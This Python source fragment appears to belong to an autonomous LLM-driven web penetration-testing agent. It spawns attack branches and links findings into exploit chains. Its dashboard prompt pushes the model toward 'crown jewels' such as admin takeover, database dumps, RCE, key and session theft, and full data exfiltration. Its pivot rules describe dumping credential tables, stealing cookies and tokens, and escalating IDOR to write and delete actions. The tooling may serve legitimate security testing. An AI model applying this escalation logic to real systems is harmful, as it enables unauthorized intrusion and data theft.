        candidate_id = candidate_map.get(skill)
        if not candidate_id:
            return
        params = ", ".join((tested_params or [])[:4]) or "default params"
        retry_summary = (
            f"{skill} remained inconclusive at round {round_num}; "
            f"retry with stronger payload variant on {url or self.state.target} "
            f"against params [{params}]"
        )
        self._mark_retryable_candidate(
            candidate_id,
            tool=skill,
            summary=retry_summary,
            evidence=f"{url} round={round_num} params={params}".strip(),
        )
        self.state.add_shared_note(f"Retryable {candidate_id}: round {round_num} inconclusive on {url or self.state.target}")

    def _parent_branch_ids_for_finding(self, args: dict[str, Any]) -> list[str]:
        ftype = str(args.get("finding_type") or "").lower()
        title = str(args.get("title") or "").lower()
        component = str(args.get("affected_component") or "").lower()
        blob = f"{ftype} {title} {component}"
        matches: list[str] = []
        mapping = [
            (("sql", "sqli"), "web:sqli"),
            (("auth", "login", "jwt", "session"), "web:auth-bypass"),
            (("idor", "access", "privilege"), "web:idor"),
            (("xss",), "web:xss"),
            (("ssrf",), "web:ssrf"),
            (("info", "sensitive", "disclosure", "traversal", "config"), "web:sensitive-files"),
            (("cve",), "web:cve-scan"),
        ]
        for needles, cid in mapping:
            if any(needle in blob for needle in needles):
                matches.append(cid)
        seen: set[str] = set()
        result: list[str] = []
        for branch_id in matches:
            if branch_id in self.state.branches and branch_id not in seen:
                seen.add(branch_id)
                result.append(branch_id)
        return result

    def _spawn_followup_branches_from_finding(
        self,
        finding_id: str,
        args: dict[str, Any],
    ) -> None:
        ftype = str(args.get("finding_type") or "").lower()
        title = str(args.get("title") or "").strip()
        component = str(args.get("affected_component") or "").strip()
        severity = str(args.get("severity") or "").lower()
        parent_branch_ids = self._parent_branch_ids_for_finding(args) or ["root"]
        severity_boost = {"critical": 10, "high": 8, "medium": 5, "low": 2, "informational": 1}.get(severity, 0)

        pivot_rules: list[tuple[tuple[str, ...], list[dict[str, Any]]]] = [
            (
                ("auth", "login", "jwt", "session", "credential"),
                [
                    {
                        "suffix": "post-auth-enum",
                        "vector_id": "WEB-AUTH-PIVOT",
                        "title": "Expand authenticated route coverage",
                        "priority": 90,
                        "objective": "Use the obtained session to map authenticated APIs, admin pages, and role-protected flows.",
                        "next_step": "Reuse the live session with browser_get_cookies, browser_eval_js, post_auth_enum, then browse /admin and authenticated API paths.",
                        "crown_jewel": "admin takeover or broad data access",
                        "watch_terms": ["token", "cookie", "/admin", "/api/users", "post_auth_enum"],
                    },
                    {
                        "suffix": "admin-access-control",
                        "vector_id": "WEB-AC-PIVOT",
                        "title": "Probe admin-only access controls with the new session",
                        "priority": 95,
                        "objective": "Confirm whether the authenticated state crosses privilege boundaries into admin-only actions.",
                        "next_step": "Directly test /admin, /admin/users, role changes, and privileged exports with the current session.",
                        "crown_jewel": "admin takeover",
                        "watch_terms": ["/admin", "role", "export", "browser_navigate", "http_request"],
                    },
                ],
            ),
            (
                ("idor", "access", "privilege"),
                [
                    {
                        "suffix": "write-idor",
                        "vector_id": "WEB-IDOR-PIVOT",
                        "title": "Escalate access control weakness into write/delete impact",
                        "priority": 94,
                        "objective": "Push the access-control bug past read-only confirmation into write, delete, or role-changing impact.",
                        "next_step": "Replay the vulnerable object reference against PATCH/PUT/DELETE or role/state-changing endpoints.",
                        "crown_jewel": "account takeover or broad data manipulation",
                        "watch_terms": ["put", "patch", "delete", "role", "user", "account", "idor"],
                    },
                    {
                        "suffix": "data-exfil",
                        "vector_id": "WEB-EXFIL-PIVOT",
                        "title": "Test whether the access-control gap scales to bulk data access",
                        "priority": 88,
                        "objective": "Check whether the same boundary failure opens mass export or neighboring-account traversal.",
                        "next_step": "Enumerate adjacent IDs, list endpoints, and export/download flows to quantify blast radius.",
                        "crown_jewel": "full data exfiltration",
                        "watch_terms": ["list", "export", "download", "users", "orders", "idor"],
                    },
                ],
            ),
            (
                ("sql", "sqli"),
                [
                    {
                        "suffix": "credential-pivot",
                        "vector_id": "WEB-SQLI-PIVOT",
                        "title": "Harvest credentials or tokens from SQLi impact",
                        "priority": 96,
                        "objective": "Turn the injection into usable credentials, session material, or privilege context.",
                        "next_step": "Dump users/auth tables or config values, then attempt login/session reuse with anything exposed.",
                        "crown_jewel": "admin takeover or DB dump",
                        "watch_terms": ["sqlmap", "dump", "users", "token", "password", "select"],
                    },
                    {
                        "suffix": "db-impact",
                        "vector_id": "WEB-SQLI-IMPACT",
                        "title": "Expand SQLi toward full database impact",
                        "priority": 92,
                        "objective": "Prove the injection reaches crown-jewel data, not just a boolean/oracle condition.",
                        "next_step": "Enumerate schemas/tables and retrieve high-value rows or admin secrets from the database.",
                        "crown_jewel": "DB dump",
                        "watch_terms": ["sqlmap", "schema", "table", "dump", "union select"],
                    },
                ],
            ),
            (
                ("info", "sensitive", "disclosure", "traversal", "config", "secret"),
                [
                    {
                        "suffix": "credential-reuse",
                        "vector_id": "WEB-DISCLOSURE-PIVOT",
                        "title": "Turn disclosed material into authenticated access",
                        "priority": 89,
                        "objective": "Check whether leaked config, keys, or tokens grant privileged access.",
                        "next_step": "Validate any disclosed credentials, tokens, or internal routes against live login or admin/API endpoints.",
                        "crown_jewel": "admin takeover",
                        "watch_terms": ["token", "key", "password", "config", "admin", "login"],
                    },
                    {
                        "suffix": "admin-surface",
                        "vector_id": "WEB-ADMIN-PIVOT",
                        "title": "Use the disclosure to map privileged routes and internal surfaces",
                        "priority": 84,
                        "objective": "Pivot from leaked route/config hints into direct access checks on privileged endpoints.",
                        "next_step": "Follow leaked URLs, JS routes, backups, and internal paths to admin consoles or sensitive APIs.",
                        "crown_jewel": "privileged route exposure",
                        "watch_terms": ["/admin", "backup", "config", ".env", ".git", "actuator"],
                    },
                ],
            ),
            (
                ("xss",),
                [
                    {
                        "suffix": "session-pivot",
                        "vector_id": "WEB-XSS-PIVOT",
                        "title": "Turn XSS into session or privileged action impact",
                        "priority": 90,
                        "objective": "Move from script execution proof into session theft or admin-only action execution.",
                        "next_step": "Read cookies/localStorage tokens and test whether the session reaches admin pages or sensitive actions.",
                        "crown_jewel": "session takeover",
                        "watch_terms": ["document.cookie", "localStorage", "token", "/admin", "browser_eval_js"],
                    },
                ],
            ),
        ]

        for parent_branch_id in parent_branch_ids:
            parent = self.state.branches.get(parent_branch_id)
            if parent is None:
                continue
            parent.status = "active"
            parent.last_report = f"Finding {finding_id} reported: {title[:120]}"
            parent.last_summary = parent.last_report
            if component:
                parent.evidence = (parent.evidence + "; " + component).strip("; ")
            for needles, pivots in pivot_rules:
                if not any(needle in ftype or needle in title.lower() for needle in needles):
                    continue
                for pivot in pivots:
                    branch_id = self._reuse_or_allocate_followup_branch_id(
                        parent_branch_id=parent_branch_id,
                        finding_id=finding_id,
                        vector_id=str(pivot["vector_id"]),
                        suffix=str(pivot["suffix"]),
                        crown_jewel=str(pivot["crown_jewel"]),
                    )
                    branch = self.state.ensure_branch(
                        branch_id,
                        str(pivot["vector_id"]),
                        str(pivot["title"]),
                        priority=int(pivot["priority"]) + severity_boost,
                        role=self._infer_branch_role(
                            vector_id=str(pivot["vector_id"]),
                            title=str(pivot["title"]),
                            objective=str(pivot["objective"]),
                            source_finding_id=finding_id,
                            crown_jewel=str(pivot["crown_jewel"]),
                        ),
                        owner="root",
                        parent_branch_id=parent_branch_id,
                        source_candidate_id=parent.source_candidate_id or parent_branch_id,
                        source_finding_id=finding_id,
                        objective=str(pivot["objective"]),
                        next_step=str(pivot["next_step"]),
                        crown_jewel=str(pivot["crown_jewel"]),
                        evidence=f"{finding_id}: {title} @ {component}".strip(),
                        watch_terms=list(pivot.get("watch_terms") or []),
                    )
                    branch.status = "open"
                    branch.last_report = f"Spawned from {finding_id}: {title[:100]}"
                    self.state.ensure_scan_todo(
                        branch_id,
                        branch.title,
                        priority=branch.priority,
                        source_candidate_id=branch.source_candidate_id or branch_id,
                    )
                    self.state.add_shared_note(
                        f"{parent.vector_id} -> {branch.vector_id}: {branch.title}"
                    )
            self._emit_control_plane(f"Root spawned follow-up branches from {finding_id}")

    def _reuse_or_allocate_followup_branch_id(
        self,
        *,
        parent_branch_id: str,
        finding_id: str,
        vector_id: str,
        suffix: str,
        crown_jewel: str,
    ) -> str:
        for branch in self.state.branches.values():
            if branch.source_finding_id != finding_id:
                continue
            if str(branch.vector_id) != str(vector_id):
                continue
            if str(branch.crown_jewel) != str(crown_jewel):
                continue
            return branch.id
        return f"{parent_branch_id}:{suffix}"

    def _branch_ids_for_action(self, name: str, args: dict[str, Any] | Any) -> list[str]:
        blob = f"{name} {self._preview_args(args)}"
        matches: list[str] = []
        for branch in self.state.active_branches():
            terms = branch.watch_terms or []
            if not terms:
                continue
            if any(term in blob for term in terms):
                matches.append(branch.id)
        return matches

    def _fallback_branch_ids_for_candidates(self, candidate_ids: list[str]) -> list[str]:
        if not candidate_ids:
            return []
        matches: list[str] = []
        seen: set[str] = set()
        candidate_set = {str(cid) for cid in candidate_ids if cid}
        for branch in self.state.active_branches():
            if (
                branch.id in candidate_set
                or branch.source_candidate_id in candidate_set
                or branch.parent_branch_id in candidate_set
            ):
                if branch.id not in seen:
                    seen.add(branch.id)
                    matches.append(branch.id)
        return matches

    @staticmethod
    def _chain_candidate_for_pair(prior: dict[str, Any], current: dict[str, Any]) -> dict[str, Any] | None:
        try:
            from vxis.agent.tools.finding_tools import _canonical_finding_type
        except Exception:
            def _canonical_finding_type(value: str) -> str:
                return str(value or "").lower().strip()

        prior_type = _canonical_finding_type(str(prior.get("finding_type", "")))
        current_type = _canonical_finding_type(str(current.get("finding_type", "")))
        prior_blob = " ".join(
            str(prior.get(key, "")).lower()
            for key in ("title", "description", "impact", "technical_analysis")
        )
        current_blob = " ".join(
            str(current.get(key, "")).lower()
            for key in ("title", "description", "impact", "technical_analysis")
        )

        if current_type in {"broken_access_control", "idor"}:
            if prior_type in {"weak_auth", "sql_injection"} and any(
                token in prior_blob for token in ("authentication bypass", "authenticated", "login", "token", "session")
            ):
                return {
                    "score": 300,
                    "rationale": "A proven authentication foothold was immediately reused to access data-bearing authenticated endpoints, demonstrating a concrete post-auth pivot.",
                    "crown_jewel": "authenticated data exfiltration",
                }
            if prior_type in {"weak_auth", "sql_injection"}:
                return {
                    "score": 240,
                    "rationale": "The initial foothold enables unauthorized object access and broader post-authenticated data reach.",
                    "crown_jewel": "account takeover or data exfiltration",
                }
            if prior_type == "information_disclosure":
                return {
                    "score": 170,
                    "rationale": "Leaked context shortened the path to unauthorized object access and wider data retrieval.",
                    "crown_jewel": "sensitive record exposure",
                }
        if current_type == "weak_auth":
            if prior_type in {"information_disclosure", "misconfiguration"}:
                return {
                    "score": 180,
                    "rationale": "Leaked deployment details or exposed configuration shortened the path to a working authentication bypass.",
                    "crown_jewel": "authenticated foothold",
                }
        if current_type == "sql_injection":
            if prior_type == "information_disclosure":
                return {
                    "score": 150,
                    "rationale": "Exposed routes or configuration pointed the attacker toward an injectable surface that now yields backend data.",
                    "crown_jewel": "DB dump",
                }
        if current_type == "ssrf":
            if prior_type in {"information_disclosure", "misconfiguration"}:
                return {
                    "score": 160,
                    "rationale": "Recon or exposed infrastructure details feed into a server-side fetch pivot toward internal resources.",
                    "crown_jewel": "internal service access",
                }
        if current_type == "xss":
            if prior_type in {"weak_auth", "broken_access_control", "information_disclosure"}:
                return {
                    "score": 130,
                    "rationale": "The existing session or weak authorization context makes script execution materially useful for takeover or privileged action abuse.",
                    "crown_jewel": "session takeover",
                }
        if prior_type == "sql_injection" and current_type in {"broken_access_control", "idor"} and any(
            token in current_blob for token in ("authenticated", "user data", "post-auth", "token", "session")
        ):
            return {
                "score": 220,
                "rationale": "The injection-derived foothold opened post-authenticated data-bearing endpoints, turning code/data execution into concrete data access.",
                "crown_jewel": "privileged data exfiltration",
            }
        return None

    async def _maybe_auto_link_chain(self, finding_id: str) -> None:
        try:
            from vxis.agent.tools.finding_tools import (
                _get_chains,
                _get_findings,
            )
        except Exception:
            return

        findings = _get_findings()
        current = next((f for f in findings if f.get("id") == finding_id), None)
        if not current:
            return

        existing_pairs = {
            tuple(c.get("finding_ids", []))
            for c in _get_chains()
            if isinstance(c.get("finding_ids"), list)
        }
        severity = str(current.get("severity", "low")).lower()
        if severity not in {"critical", "high", "medium"}:
            return
        best_candidate: dict[str, Any] | None = None
        for prior in reversed(findings[:-1]):
            pair = (str(prior["id"]), finding_id)
            if pair in existing_pairs:
                continue
            candidate = self._chain_candidate_for_pair(prior, current)
            if not candidate:
                continue
            candidate.update({"source_id": pair[0], "target_id": pair[1]})
            if best_candidate is None or int(candidate["score"]) > int(best_candidate["score"]):
                best_candidate = candidate
        if best_candidate is None:
            return
        result = await self.registry.dispatch("link_chain", {
            "finding_ids": [best_candidate["source_id"], best_candidate["target_id"]],
            "rationale": best_candidate["rationale"],
            "crown_jewel": best_candidate["crown_jewel"],
        })
        if result.ok:
            self._settle_branches_after_chain([best_candidate["source_id"], best_candidate["target_id"]])
            logger.info("auto-linked chain %s -> %s", best_candidate["source_id"], finding_id)

    def _suggest_chain_candidates(self, *, limit: int = 3) -> list[dict[str, str]]:
        try:
            from vxis.agent.tools.finding_tools import _get_chains, _get_findings
        except Exception:
            return []

        findings = list(_get_findings() or [])
        if len(findings) < 2:
            return []

        existing_pairs = {
            tuple(c.get("finding_ids", []))
            for c in _get_chains()
            if isinstance(c.get("finding_ids"), list)
        }
        suggestions: list[dict[str, Any]] = []
        for current in reversed(findings):
            severity = str(current.get("severity", "low")).lower()
            if severity not in {"critical", "high", "medium"}:
                continue
            for prior in reversed(findings):
                if prior.get("id") == current.get("id"):
                    continue
                pair = (str(prior.get("id", "")), str(current.get("id", "")))
                if not pair[0] or not pair[1] or pair in existing_pairs:
                    continue
                candidate = self._chain_candidate_for_pair(prior, current)
                if not candidate:
                    continue
                suggestions.append({
                    "source_id": pair[0],
                    "target_id": pair[1],
                    "source_type": str(prior.get("finding_type", "")),
                    "target_type": str(current.get("finding_type", "")),
                    "source_title": str(prior.get("title", "")),
                    "target_title": str(current.get("title", "")),
                    "source_component": str(prior.get("affected_component", "")),
                    "target_component": str(current.get("affected_component", "")),
                    "rationale": candidate["rationale"],
                    "crown_jewel": candidate["crown_jewel"],
                    "score": candidate["score"],
                })
        suggestions.sort(key=lambda item: int(item.get("score", 0)), reverse=True)
        deduped: list[dict[str, Any]] = []
        seen_pairs: set[tuple[str, str]] = set()
        seen_target_paths: set[tuple[str, str, str]] = set()
        seen_target_families: set[tuple[str, str]] = set()
        seen_family_pairs: set[tuple[str, str, str]] = set()
        for item in suggestions:
            pair = (str(item["source_id"]), str(item["target_id"]))
            if pair in seen_pairs:
                continue
            target_sig = (
                str(item.get("target_id", "")),
                str(item.get("target_type", "")),
                str(item.get("crown_jewel", "")),
            )
            if target_sig in seen_target_paths:
                continue
            family_sig = (
                str(item.get("target_type", "")),
                str(item.get("crown_jewel", "")),
            )
            if family_sig in seen_target_families:
                continue
            family_pair_sig = (
                str(item.get("source_type", "")),
                str(item.get("target_type", "")),
                str(item.get("crown_jewel", "")),
            )
            if family_pair_sig in seen_family_pairs:
                continue
            seen_pairs.add(pair)
            seen_target_paths.add(target_sig)
            seen_target_families.add(family_sig)
            seen_family_pairs.add(family_pair_sig)
            deduped.append(item)
            if len(deduped) >= limit:
                break
        return [
            {
                "source_id": str(item["source_id"]),
                "target_id": str(item["target_id"]),
                "source_type": str(item.get("source_type", "")),
                "target_type": str(item.get("target_type", "")),
                "source_title": str(item.get("source_title", "")),
                "target_title": str(item.get("target_title", "")),
                "source_component": str(item.get("source_component", "")),
                "target_component": str(item.get("target_component", "")),
                "rationale": str(item["rationale"]),
                "crown_jewel": str(item["crown_jewel"]),
            }
            for item in deduped
        ]

    async def _maybe_auto_link_suggested_chain(self) -> dict[str, Any] | None:
        candidates = self._suggest_chain_candidates(limit=3)
        if not candidates:
            return None
        candidate = candidates[0]
        result = await self.registry.dispatch("link_chain", {
            "finding_ids": [candidate["source_id"], candidate["target_id"]],
            "rationale": candidate["rationale"],
            "crown_jewel": candidate["crown_jewel"],
        })
        if not result.ok:
            return None
        if isinstance(result.data, dict) and result.data.get("dedup"):
            return None
        self._settle_branches_after_chain([candidate["source_id"], candidate["target_id"]])
        logger.info(
            "judge auto-linked suggested chain %s -> %s",
            candidate["source_id"],
            candidate["target_id"],
        )
        self.state.add_message("system", {
            "hint": (
                f"SYSTEM HINT: auto-linked chain {candidate['source_id']} -> {candidate['target_id']} "
                f"toward {candidate['crown_jewel']}. Re-evaluate whether finish_scan is now justified."
            ),
        })
        return {
            "source_id": candidate["source_id"],
            "target_id": candidate["target_id"],
            "crown_jewel": candidate["crown_jewel"],
        }

    async def _decide(self, state: ScanLoopState) -> list[tuple[str, dict[str, Any]]]:
        """Returns list of (tool_name, args). Delegates to brain.think_in_loop when brain is set."""
        if self.brain is None:
            return [("finish_scan", {})]
        # Phase D scan dashboard: inject a compact progress summary into
        # every think call. This compensates for Brain's 20-message history
        # window — by iter 15, Brain has forgotten iters 1-10. The dashboard
        # gives it a complete picture in <40 lines.
        dashboard = self._build_scan_dashboard()
        messages = state.messages + [{"role": "user", "content": dashboard, "iter": state.iteration}]
        return await self.brain.think_in_loop(messages, self._brain_tool_catalog())

    def _brain_tool_catalog(self) -> list[dict[str, Any]]:
        catalog = self.registry.describe_all()
        profile = self._llm_discipline_profile()
        if profile != "local_strict":
            return catalog

        focus = self._focus_branch()
        findings_count = len(self.state.findings)
        early = self.state.iteration <= self._focus_grace_iterations() and findings_count == 0

        core = {
            "finish_scan",
            "think",
            "wait",
            "report_finding",
            "query_findings",
            "link_chain",
            "verify_finding",
            "run_skill",
        }
        recon = {
            "fingerprint_target",
            "list_playbooks",
            "load_playbook",
            "http_request",
            "browser_render",
            "browser_navigate",
            "browser_analyze_dom",
            "shell_exec",
        }
        auth = {
            "browser_fill_form",
            "browser_get_cookies",
            "browser_eval_js",
            "http_request",
            "browser_navigate",
            "shell_exec",
            "run_skill",
        }
        post_auth = {
            "browser_get_cookies",
            "browser_eval_js",
            "browser_navigate",
            "http_request",
            "shell_exec",
            "python_exec",
            "run_skill",
            "query_scan_memory",
        }
        xss_ssrf = {
            "browser_render",
            "browser_navigate",
            "browser_eval_js",
            "http_request",
            "shell_exec",
            "python_exec",
            "run_skill",
        }

        allowed = set(core)
        if early or focus is None:
            allowed |= recon
        if focus is not None:
            family = self._branch_family(focus)
            if family in {"auth", "injection"}:
                allowed |= auth
            if focus.role == "post_exploit_worker" or focus.phase in {"session_reuse", "privilege_probe", "data_access"}:
                allowed |= post_auth
            if family in {"xss", "ssrf"}:
                allowed |= xss_ssrf
            if family == "disclosure":
                allowed |= {"http_request", "browser_navigate", "shell_exec", "run_skill", "query_scan_memory"}
            if family == "idor":
                allowed |= {"http_request", "browser_navigate", "browser_get_cookies", "run_skill", "shell_exec"}

        filtered = [tool for tool in catalog if str(tool.get("name") or "") in allowed]
        return filtered or catalog

    def _build_scan_dashboard(self) -> str:
        """Build a compact scan-progress dashboard injected every iteration.

        Brain sees this every iteration instead of scrolling through 200+
        messages. Focused on: what did you find, what haven't you tested,
        what should your next GOAL be.
        """
        s = self.state
        local_strict = self._llm_discipline_profile() == "local_strict"
        finding_limit = 3 if local_strict else 5
        candidate_limit = 6 if local_strict else 10
        branch_limit = 4 if local_strict else 8
        review_limit = 3 if local_strict else 5
        endpoint_limit = 4 if local_strict else 8
        note_limit = 2 if local_strict else 4

        # Collect state from messages
        tools_used: set[str] = set()
        endpoints_seen: set[str] = set()
        for m in s.messages:
            content = m.get("content", {})
            if isinstance(content, dict) and content.get("name"):
                tools_used.add(content["name"])
                args = content.get("args", {})
                if isinstance(args, dict):
                    for k in ("url", "affected_component"):
                        if args.get(k):
                            endpoints_seen.add(str(args[k])[:80])

        try:
            from vxis.agent.tools.finding_tools import _get_findings
            reported = _get_findings()
        except Exception:
            reported = []

        # Build attack vector checklist
        tested_vectors: dict[str, str] = {}  # vector → status
        finding_types = {f.get("finding_type", "") for f in reported}

        vectors = [
            ("SQLi", "sql_injection", "shell_exec" in tools_used or "sql" in str(finding_types)),
            ("XSS", "xss", "browser_eval_js" in tools_used),
            ("Auth bypass", "auth_bypass", "browser_fill_form" in tools_used),
            ("IDOR", "idor", any("idor" in str(f.get("finding_type","")).lower() for f in reported)),
            ("Sensitive files", "information_disclosure", "load_playbook" in tools_used),
            ("Dir bruteforce", "directory", any(m.get("role") == "tool" and "ffuf" in str(m.get("content", {}).get("args", "")) for m in s.messages)),
            ("CVE scan", "cve", any(m.get("role") == "tool" and "nuclei" in str(m.get("content", {}).get("args", "")) for m in s.messages)),
        ]
        for name, ftype, tested in vectors:
            found = ftype in finding_types
            if found:
                tested_vectors[name] = "✓ FOUND"
            elif tested:
                tested_vectors[name] = "tested, nothing yet"
            else:
                tested_vectors[name] = "⬚ NOT TESTED"

        # Determine current goal based on what's missing
        untested = [name for name, status in tested_vectors.items() if "NOT TESTED" in status]

        # Check existing chains
        try:
            from vxis.agent.tools.finding_tools import _get_chains
            existing_chains = _get_chains()
        except Exception:
            existing_chains = []

        header = "SCAN DASHBOARD" if not local_strict else "LOCAL SCAN DASHBOARD"
        lines: list[str] = [f"═══ {header} (iter {s.iteration}) ═══"]

        # Findings
        if reported:
            lines.append(f"Findings ({len(reported)}):")
            for f in reported[-finding_limit:]:
                lines.append(f"  [{f.get('severity','?').upper()}] {f['id']}: {f.get('title','?')[:60]}")
        else:
            lines.append("Findings: 0")

        # Attack vector checklist
        lines.append("Attack vectors:")
        for name, status in tested_vectors.items():
            lines.append(f"  {status} {name}")

        # Durable vector candidate queue. This is the stateful contract: Brain
        # must drive each plausible vector to found/clean/blocked/dead instead
        # of merely picking from a tool list and forgetting failed hypotheses.
        candidates = sorted(
            s.vector_candidates.values(),
            key=lambda c: (-c.priority, c.status in _TERMINAL_VECTOR_STATUSES, c.attempts, c.id),
        )
        if candidates:
            lines.append("Vector candidates (durable state):")
            for c in candidates[:candidate_limit]:
                marker = {
                    "open": "OPEN",
                    "retryable": "RETRY",
                    "attempted": "TRY",
                    "failed": "FAIL",
                    "found": "FOUND",
                    "clean": "CLEAN",
                    "blocked": "BLOCK",
                    "dead": "DEAD",
                }.get(c.status, c.status.upper())
                lines.append(
                    f"  {marker} p{c.priority} {c.id} ({c.vector_id}) "
                    f"attempts={c.attempts}: {c.title}"
                )

        active_branches = s.active_branches()
        if active_branches:
            lines.append("Branch dossiers (root-owned attack paths):")
            for b in active_branches[:branch_limit]:
                lines.append(
                    f"  {b.status.upper()} p{b.priority} {b.id} role={b.role} phase={b.phase} owner={b.owner} "
                    f"attempts={b.attempts} -> {b.title}"
                )
                if b.objective:
                    lines.append(f"     objective: {b.objective[:80 if local_strict else 110]}")
                if b.next_step:
                    lines.append(f"     next: {b.next_step[:80 if local_strict else 110]}")
                if b.last_report:
                    lines.append(f"     last: {b.last_report[:80 if local_strict else 110]}")
                if b.blocker:
                    lines.append(f"     blocker: {b.blocker[:70 if local_strict else 90]}")

        # Endpoints
        if endpoints_seen:
            lines.append(f"Known endpoints: {', '.join(sorted(endpoints_seen)[:endpoint_limit])}")

        if s.shared_notes:
            lines.append("Shared notes:")
            for note in s.shared_notes[-note_limit:]:
                lines.append(f"  - {note[:80 if local_strict else 120]}")
            memory_notes = [note for note in s.shared_notes if note.startswith("memory")]
            if memory_notes:
                lines.append("Memory directives:")
                strategy = next((note for note in memory_notes if note.startswith("memory strategy:")), "")
                if strategy:
                    lines.append(f"  {strategy[:90 if local_strict else 160]}")
                refuted = [note for note in memory_notes if note.startswith("memory refuted:")][:2 if local_strict else 3]
                for note in refuted:
                    lines.append(f"  {note[:90 if local_strict else 160]}")
                branch_reopens = [note for note in memory_notes if note.startswith("memory branch:")][:2 if local_strict else 3]
                for note in branch_reopens:
                    lines.append(f"  {note[:90 if local_strict else 160]}")

        review_items = s.review_queue_as_dicts()
        if review_items:
            lines.append("AI review queue:")
            for item in review_items[:review_limit]:
                lines.append(
                    f"  {item['status'].upper()} {item['stage']} {item['id']}: "
                    f"{item['title'][:48 if local_strict else 70]}"
                )
                if item.get("reason"):
                    lines.append(f"     reason: {str(item['reason'])[:72 if local_strict else 120]}")
                if item.get("action_hint"):
                    lines.append(f"     next: {str(item['action_hint'])[:72 if local_strict else 120]}")

        # ── Chain Intelligence section (always on when 2+ findings) ──
        # Brain-First: Brain decides HOW to chain, we just keep the pressure
        # on every iteration. No "fire once and forget" — chain awareness must
        # persist in Brain's working context for the entire scan.
        _desired_chains = max(3, len(reported) // 3)
        if len(reported) >= 2 and not local_strict:
            lines.append("")
            lines.append("═══ CHAIN INTELLIGENCE ═══")
            if existing_chains:
                lines.append(f"Chains recorded: {len(existing_chains)} / {_desired_chains}+ target")
                for c in existing_chains:
                    lines.append(f"  {c.get('id','?')}: {' → '.join(c.get('finding_ids',[]))} → {c.get('crown_jewel','?')[:40]}")
                if len(existing_chains) < _desired_chains:
                    lines.append(f"  ⚠ Build MORE chains — {_desired_chains - len(existing_chains)} more to reach target.")
            else:
                lines.append(f"Chains recorded: 0 / {_desired_chains}+ target  ⚠ BUILD ATTACK CHAINS NOW")

            # Broad finding-type grouping — every type lands somewhere
            # so Brain always sees chain candidates regardless of scan target.
            _cat = {
                "entry": (  # unauthenticated entry vectors
                    "sql_injection", "xss", "xss_reflected", "xss_stored", "xss_dom",
                    "ssrf", "xxe", "command_injection", "ssti", "csrf",
                    "open_redirect", "path_traversal",
                ),
                "auth": (  # authentication / session weaknesses
                    "auth_bypass", "weak_auth", "jwt_none", "jwt_confusion",
                    "session_fixation", "default_credentials", "password_reset_poisoning",
                ),
                "access": (  # authorization / access control
                    "broken_access_control", "idor", "verb_tampering",
                    "mass_assignment", "privilege_escalation", "no_rate_limit",
                ),
                "infra": (  # infra / misconfig / crypto
                    "misconfiguration", "weak_crypto", "information_disclosure",
                    "sensitive_data_exposure", "error_oracle",
                ),
                "logic": (  # business logic
                    "business_logic", "race_condition", "price_manipulation",
                    "negative_quantity", "state_bypass",
                ),
            }
            _by_cat: dict[str, list[dict[str, Any]]] = {k: [] for k in _cat}
            _uncat: list[dict[str, Any]] = []
            for f in reported:
                ft = str(f.get("finding_type", "")).lower()
                placed = False
                for cat, types in _cat.items():
                    if ft in types or any(ft.startswith(t) for t in types):
                        _by_cat[cat].append(f)
                        placed = True
                        break
                if not placed:
                    _uncat.append(f)

            lines.append("Findings by category:")
            for cat, items in _by_cat.items():
                if items:
                    ids = ", ".join(f["id"] for f in items[:4])
                    lines.append(f"  {cat}: {ids}" + (f" (+{len(items)-4})" if len(items) > 4 else ""))
            if _uncat:
                lines.append(f"  other: {', '.join(f['id'] for f in _uncat[:4])}")

            # Suggest concrete chain candidates — any cross-category pair
            # with at least one finding each. Brain decides whether the chain
            # is real; we just make the candidates visible.
            _chain_candidates: list[tuple[str, list[str], str]] = []
            if _by_cat["entry"] and _by_cat["access"]:
                _chain_candidates.append((
                    "entry → access",
                    [_by_cat["entry"][0]["id"], _by_cat["access"][0]["id"]],
                    "bypass login then abuse weak authZ for data access",
                ))
            if _by_cat["auth"] and _by_cat["access"]:
                _chain_candidates.append((
                    "auth → access",
                    [_by_cat["auth"][0]["id"], _by_cat["access"][0]["id"]],
                    "compromised session then IDOR/rate-limit abuse",
                ))
            if _by_cat["infra"] and _by_cat["auth"]:
                _chain_candidates.append((
                    "infra → auth",
                    [_by_cat["infra"][0]["id"], _by_cat["auth"][0]["id"]],
                    "leaked config/keys forge tokens or reset password",
                ))
            if _by_cat["infra"] and _by_cat["access"]:
                _chain_candidates.append((
                    "infra → access",
                    [_by_cat["infra"][0]["id"], _by_cat["access"][0]["id"]],
                    "exposed config reveals admin endpoints; hit them without auth",
                ))
            if _by_cat["entry"] and _by_cat["logic"]:
                _chain_candidates.append((
                    "entry → logic",
                    [_by_cat["entry"][0]["id"], _by_cat["logic"][0]["id"]],
                    "injection-assisted logic abuse (e.g. race + price manipulation)",
                ))
            # CSRF + any auth/access = account takeover vector
            _csrf = [f for f in reported if "csrf" in str(f.get("finding_type","")).lower()]
            _rate = [f for f in reported if "rate" in str(f.get("finding_type","")).lower()]
            if _csrf and (_by_cat["auth"] or _by_cat["access"]):
                target_f = (_by_cat["auth"] or _by_cat["access"])[0]
                _chain_candidates.append((
                    "csrf → account takeover",
                    [_csrf[0]["id"], target_f["id"]],
                    "craft CSRF payload hitting authenticated state-change endpoint",
                ))
            if _rate and _by_cat["auth"]:
                _chain_candidates.append((
                    "no-rate-limit → credential brute force",
                    [_rate[0]["id"], _by_cat["auth"][0]["id"]],
                    "absence of throttling enables credential stuffing",
                ))
            # Fallback: any two findings are candidates if nothing else emerged
            if not _chain_candidates and len(reported) >= 2:
                _chain_candidates.append((
                    "any → any",
                    [reported[0]["id"], reported[-1]["id"]],
                    "explore whether these two findings compound",
                ))

            if _chain_candidates:
                lines.append("Potential chains (Brain decides which are real):")
                for label, ids, why in _chain_candidates[:5]:
                    lines.append(f"  {label}: {' → '.join(ids)} — {why}")

            lines.append("")
            lines.append("CHAIN PROTOCOL:")
            lines.append("  1. Pick 2+ findings that plausibly compose.")
            lines.append("  2. Actually TRY the chain (use tools to prove exploitability).")
            lines.append("  3. Call link_chain(finding_ids=[...], rationale=..., crown_jewel=...).")
            lines.append("  4. Repeat for every combination you can imagine.")
            lines.append("CROWN JEWELS: admin takeover, DB dump, RCE, key theft, full data exfil.")

        # Current goal — chain pressure never disappears when chains are 0
        _chain_pressure = len(reported) >= 2 and not existing_chains
        open_candidates = [c for c in s.open_vector_candidates() if c.attempts == 0]
        retry_candidates = [c for c in s.open_vector_candidates() if c.attempts > 0]
        if active_branches and not _chain_pressure:
            b = active_branches[0]
            lines.append(f"\n>> PRIMARY GOAL: drive branch {b.id} toward {b.crown_jewel or 'real impact'}.")
            if b.objective:
                lines.append(f"   Objective: {b.objective}")
            if b.next_step:
